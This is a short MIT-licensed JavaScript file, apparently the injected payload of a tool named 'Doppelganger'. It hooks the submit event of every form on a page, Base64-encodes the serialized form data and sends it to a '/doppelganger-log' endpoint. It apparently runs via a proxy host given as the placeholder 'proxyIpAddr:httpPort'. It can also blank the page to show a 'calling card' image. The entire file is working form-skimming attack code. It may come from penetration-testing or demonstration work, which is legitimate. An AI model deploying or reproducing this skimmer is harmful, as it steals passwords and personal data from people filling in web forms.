/*
Copyright (c) 2008, 2009 Edward J. Zaborowski

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

var httpServer="http://proxyIpAddr:httpPort";
var $jDoppelganger = "";

$jDoppelganger = jQuery.noConflict();

function initialize_doppelganger()
{
	//display_calling_card();
	form_steal();
	alert("Doppelganger running!");
}

function display_calling_card()
{
	var calling_card = httpServer + "/images/calling_card.jpg";
	
	var img = $jDoppelganger(document.createElement("img"));
	img.attr('src', calling_card);

	$jDoppelganger("body").empty();
	img.appendTo("body");
}

function steal_form_data(form)
{
	var encoded_form_data = Base64.encode($jDoppelganger(form).serialize());

	var url = "/doppelganger-log?formdata=" + encoded_form_data.substring(0, encoded_form_data.length - 2);
	$jDoppelganger.get(url);
}

function form_steal()
{
	$jDoppelganger('form').bind('submit', function(e) { steal_form_data(this); });
}

$jDoppelganger(document).ready(function() { initialize_doppelganger(); });
